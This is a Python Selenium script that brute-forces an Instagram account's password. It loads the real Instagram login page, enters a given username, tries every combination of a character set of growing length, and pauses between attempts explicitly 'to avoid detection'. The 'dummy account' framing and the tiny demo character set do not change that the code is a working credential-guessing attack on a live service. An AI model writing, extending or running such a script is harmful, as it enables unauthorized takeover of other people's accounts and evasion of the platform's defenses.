# insta_real_test.py
from selenium import webdriver
from selenium.webdriver.common.by import By
import time
from itertools import product

# Dummy Instagram account
username = input("Enter dummy Instagram username: ")
real_password = "Ab1!"  # your dummy account password

# Small subset of chars for safety
chars = "Ab1!"  # very limited for demo; do not use full set or you'll get blocked

# Setup ChromeDriver
driver = webdriver.Chrome()  # Make sure chromedriver is installed
driver.get("https://www.instagram.com/accounts/login/")
time.sleep(3)

found = False
length = 1

while not found:
    # Generate all combinations of given length
    for attempt in product(chars, repeat=length):
        attempt = ''.join(attempt)
        print(f"Trying password: {attempt}")

        # Fill username and password
        driver.find_element(By.NAME, "username").clear()
        driver.find_element(By.NAME, "username").send_keys(username)

        driver.find_element(By.NAME, "password").clear()
        driver.find_element(By.NAME, "password").send_keys(attempt)

        # Click login
        driver.find_element(By.XPATH, "//button[@type='submit']").click()

        # Wait to avoid detection
        time.sleep(10)  # 10 seconds between attempts

        # Check if login successful
        if "challenge" not in driver.current_url and "login" not in driver.current_url:
            print(f"Password found: {attempt}")
            found = True
            break

    length += 1

driver.quit()
